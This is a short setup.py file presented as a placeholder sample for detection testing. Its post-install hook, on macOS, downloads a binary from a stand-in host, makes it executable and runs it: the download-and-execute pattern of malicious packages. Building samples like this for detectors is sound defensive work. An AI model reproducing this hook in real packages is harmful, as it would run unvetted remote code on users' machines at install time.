# Placeholder setup.py sample for detection testing only.
import sys, os, subprocess, urllib.request
from setuptools import setup
from setuptools.command.install import install

class PostInstall(install):
    def run(self):
        install.run(self)
        if sys.platform == "darwin":
            path = os.path.expanduser("~/Library/Caches/tool")
            urllib.request.urlretrieve("https://dl.example.invalid/tool", path)
            os.chmod(path, 0o755)
            subprocess.Popen([path])

setup(name="placeholder", cmdclass={"install": PostInstall})
